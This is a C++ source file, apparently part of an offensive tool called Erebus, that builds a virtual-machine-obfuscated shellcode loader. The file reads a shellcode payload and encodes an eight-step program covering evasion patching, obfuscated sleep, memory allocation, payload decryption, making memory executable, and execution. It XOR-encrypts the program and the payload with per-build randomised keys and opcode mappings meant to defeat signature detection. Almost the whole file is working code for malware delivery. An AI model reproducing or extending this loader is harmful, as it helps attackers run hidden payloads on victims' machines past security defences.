/*
 * vmloader_builder.cpp - host-side IR emitter for Erebus.VMLoader
 *
 * Reads shellcode[] from Erebus.Loader/include/shellcode.hpp,
 * builds an 8-op IR program, XOR-encrypts both the IR blob and the
 * payload with vm_derive_key(VM_IR_SEED), then writes embedded.h to
 * stdout.  The loader's vmkit VM decrypts both at runtime.
 *
 * Usage:
 *   ./vmloader_builder > ../include/embedded.h
 *
 * Or via Makefile:
 *   make embedded
 *
 * Opcode forward map used here (inverse of LoaderVMConfig::opcode_reverse_map):
 *   Real → Encoded:
 *     EvasionPatch(0)→7  ObfuscatedSleep(1)→5  AllocRegion(2)→3
 *     WritePayload(3)→1  DecryptPayload(4)→6   ProtectRX(5)→0
 *     ExecPayload(6)→2   FreeRegion(7)→4
 */

#include <cstdint>
#include <cstddef>
#include <array>
#include <span>
#include <vector>
#include <cstring>
#include <cstdio>

// vmkit - cross-platform header, no Windows deps
#include "../include/vm_loader.hpp"

// Shellcode payload (populated by builder.py; stub = single 0x00 byte)
#include "../../Erebus.Loader/include/shellcode.hpp"

// ---------------------------------------------------------------------------
// Seed and key derivation - must match vmloader.hpp exactly
// ---------------------------------------------------------------------------

// [MALLEABLE] Per-build 32-bit seed. builder.py passes -DVM_IR_SEED=0x...
// with a fresh random value each build, making the XOR key unique.
#ifndef VM_IR_SEED
#define VM_IR_SEED 0xC0DE1337U
#endif

// [MALLEABLE] Per-build key derivation base (6 bytes). builder.py passes
// -DVM_KEY_BASE_0=0x.. through _5 with random bytes each build, so the
// derive_key output differs even if the seed is known.
#ifndef VM_KEY_BASE_0
#define VM_KEY_BASE_0 'e'
#define VM_KEY_BASE_1 'r'
#define VM_KEY_BASE_2 'e'
#define VM_KEY_BASE_3 'b'
#define VM_KEY_BASE_4 'u'
#define VM_KEY_BASE_5 's'
#endif

// [MALLEABLE] Sleep timing operands written into the IR blob. builder.py
// passes -DVM_SLEEP_BASE_MS=N -DVM_SLEEP_JITTER_MS=N from operator params.
#ifndef VM_SLEEP_BASE_MS
#define VM_SLEEP_BASE_MS 5000
#endif
#ifndef VM_SLEEP_JITTER_MS
#define VM_SLEEP_JITTER_MS 3000
#endif

static std::array<std::uint8_t, 32>
derive_key(std::uint32_t seed) noexcept
{
    std::array<std::uint8_t, 32> key{};
    // [MALLEABLE] base bytes replaced per-build via VM_KEY_BASE_* defines.
    constexpr std::uint8_t base[6] = {
        (std::uint8_t)VM_KEY_BASE_0,
        (std::uint8_t)VM_KEY_BASE_1,
        (std::uint8_t)VM_KEY_BASE_2,
        (std::uint8_t)VM_KEY_BASE_3,
        (std::uint8_t)VM_KEY_BASE_4,
        (std::uint8_t)VM_KEY_BASE_5,
    };
    for (std::size_t i = 0; i < key.size(); ++i)
        key[i] = static_cast<std::uint8_t>(
            base[i % 6] + (seed & 0xFF) + i * 17u);
    return key;
}

// ---------------------------------------------------------------------------
// Opcode definitions (must match ErebusVMOp in vmloader.hpp exactly)
// ---------------------------------------------------------------------------

enum class ErebusVMOp : std::uint8_t {
    EvasionPatch    = 0,
    ObfuscatedSleep = 1,
    AllocRegion     = 2,
    WritePayload    = 3,
    DecryptPayload  = 4,
    ProtectRX       = 5,
    ExecPayload     = 6,
    FreeRegion      = 7,
};

// [MALLEABLE] Opcode forward map: forward_map[real_uint8] = encoded_byte.
// This is the inverse of LoaderVMConfig::opcode_reverse_map in vmloader.hpp.
// builder.py passes -DVM_FWD_0=N through _7 with a fresh random permutation
// of [0..7] each build. The loader receives the same values as VM_FWD_* and
// inverts them to its reverse map at compile time. Both halves must agree.
#ifndef VM_FWD_0
#define VM_FWD_0 7
#define VM_FWD_1 5
#define VM_FWD_2 3
#define VM_FWD_3 1
#define VM_FWD_4 6
#define VM_FWD_5 0
#define VM_FWD_6 2
#define VM_FWD_7 4
#endif

static constexpr std::uint8_t forward_map[8] = {
    VM_FWD_0, VM_FWD_1, VM_FWD_2, VM_FWD_3,
    VM_FWD_4, VM_FWD_5, VM_FWD_6, VM_FWD_7
};

// Convenience alias so the op type matches vm_loader.hpp's template
using OpT = vmkit::Op<ErebusVMOp>;

static OpT make_op(ErebusVMOp real_op)
{
    OpT op{};
    // Encode the opcode byte using the forward map
    op.opcode = static_cast<ErebusVMOp>(
        forward_map[static_cast<std::uint8_t>(real_op)]);
    return op;
}

// ---------------------------------------------------------------------------
// Emit hex bytes as a C array initialiser
// ---------------------------------------------------------------------------

static void emit_bytes(const std::uint8_t* data, std::size_t len)
{
    for (std::size_t i = 0; i < len; ++i) {
        if (i && i % 16 == 0) std::printf("\n    ");
        std::printf("0x%02Xu", data[i]);
        if (i + 1 < len) std::printf(",");
    }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

int main()
{
    const std::uint8_t* payload_raw  = shellcode;
    const std::size_t   payload_size = sizeof(shellcode);

    // -----------------------------------------------------------------------
    // Build the 8-op IR program
    // -----------------------------------------------------------------------

    std::vector<OpT> program;
    program.reserve(8);

    // op[0]: EvasionPatch - no operands
    {
        OpT op = make_op(ErebusVMOp::EvasionPatch);
        program.push_back(op);
    }

    // op[1]: ObfuscatedSleep - u32[0]=base_ms, u32[1]=jitter_ms
    // [MALLEABLE] timing values come from operator config via VM_SLEEP_*_MS defines.
    {
        OpT op = make_op(ErebusVMOp::ObfuscatedSleep);
        op.u32[0] = static_cast<std::uint32_t>(VM_SLEEP_BASE_MS);
        op.u32[1] = static_cast<std::uint32_t>(VM_SLEEP_JITTER_MS);
        program.push_back(op);
    }

    // op[2]: AllocRegion - u32[0]=region_slot, u64[0]=payload_size
    {
        OpT op = make_op(ErebusVMOp::AllocRegion);
        op.u32[0] = 0;
        op.u64[0] = static_cast<std::uint64_t>(payload_size);
        program.push_back(op);
    }

    // op[3]: WritePayload - u32[0]=region, u32[1]=size (cast), u64[0]=src_off
    {
        OpT op = make_op(ErebusVMOp::WritePayload);
        op.u32[0] = 0;
        op.u32[1] = static_cast<std::uint32_t>(payload_size);
        op.u64[0] = 0;
        program.push_back(op);
    }

    // op[4]: DecryptPayload - u32[0]=region, u32[1]=seed, u64[0]=size
    {
        OpT op = make_op(ErebusVMOp::DecryptPayload);
        op.u32[0] = 0;
        op.u32[1] = VM_IR_SEED;
        op.u64[0] = static_cast<std::uint64_t>(payload_size);
        program.push_back(op);
    }

    // op[5]: ProtectRX - u32[0]=region, u64[0]=size
    {
        OpT op = make_op(ErebusVMOp::ProtectRX);
        op.u32[0] = 0;
        op.u64[0] = static_cast<std::uint64_t>(payload_size);
        program.push_back(op);
    }

    // op[6]: ExecPayload - u32[0]=region, u64[0]=size
    {
        OpT op = make_op(ErebusVMOp::ExecPayload);
        op.u32[0] = 0;
        op.u64[0] = static_cast<std::uint64_t>(payload_size);
        program.push_back(op);
    }

    // op[7]: FreeRegion - u32[0]=region
    {
        OpT op = make_op(ErebusVMOp::FreeRegion);
        op.u32[0] = 0;
        program.push_back(op);
    }

    // -----------------------------------------------------------------------
    // XOR-encrypt the IR blob
    // -----------------------------------------------------------------------

    const auto key = derive_key(VM_IR_SEED);

    std::vector<std::uint8_t> blob(
        reinterpret_cast<std::uint8_t*>(program.data()),
        reinterpret_cast<std::uint8_t*>(program.data()) + program.size() * sizeof(OpT));

    vmkit::xor_codec::apply(
        std::span<std::uint8_t>(blob.data(), blob.size()),
        std::span<const std::uint8_t>(key.data(), key.size()));

    // -----------------------------------------------------------------------
    // XOR-encrypt the payload
    // -----------------------------------------------------------------------

    std::vector<std::uint8_t> payload_enc(payload_raw, payload_raw + payload_size);

    vmkit::xor_codec::apply(
        std::span<std::uint8_t>(payload_enc.data(), payload_enc.size()),
        std::span<const std::uint8_t>(key.data(), key.size()));

    // -----------------------------------------------------------------------
    // Emit embedded.h
    // -----------------------------------------------------------------------

    std::printf("// Auto-generated by vmloader_builder - do not edit by hand.\n");
    std::printf("// Run: make embedded\n");
    std::printf("#pragma once\n");
    std::printf("#include <cstdint>\n");
    std::printf("#include <cstddef>\n");
    std::printf("\n");

    std::printf("inline constexpr unsigned char g_vm_ir_blob[] = {\n    ");
    emit_bytes(blob.data(), blob.size());
    std::printf("\n};\n\n");

    std::printf("inline constexpr std::uint32_t g_vm_ir_seed = 0x%08Xu;\n\n", VM_IR_SEED);

    std::printf("inline constexpr unsigned char g_vm_payload[] = {\n    ");
    emit_bytes(payload_enc.data(), payload_enc.size());
    std::printf("\n};\n\n");

    std::printf("inline constexpr std::size_t g_vm_payload_size = %zu;\n", payload_size);

    return 0;
}
